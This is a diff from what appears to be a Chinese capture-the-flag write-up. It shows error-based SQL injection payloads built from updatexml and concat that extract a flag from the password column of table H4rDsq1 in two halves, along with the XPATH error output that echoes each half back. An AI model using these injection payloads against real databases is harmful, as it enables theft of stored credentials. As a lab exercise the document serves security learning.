@@ -121,14 +121,14 @@ XPATH syntax error: '~id@,username@,password@~'
 
 #猜测flag内容在password字段里
 #==爆password数据==
-b'or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like('flag{%')),0x7e),1))#
+b'or(updatexml(1,concat(0x7e,(select`password`from`H4rDsq1`where`password`like('flag{%')),0x7e),1))# //注释掉%}
 
 #==回显结果==
 XPATH syntax error: '~flag{b4541970-14a3-4581-ae1f-30'
 
 #发现只有一半的flag，所以还需要
 #==爆破==
-b'or(updatexml(1,concat(0x7e,right((select`password`from`H4rDsq1`where`password`like('flag{%')),30),0x7e),1))#
+b'or(updatexml(1,concat(0x7e,right((select`password`from`H4rDsq1`where`password`like('flag{%')),30),0x7e),1))# //注释掉%}
 
 #==回显结果==
 XPATH syntax error: '~0-14a3-4581-ae1f-303399d179f8}~'
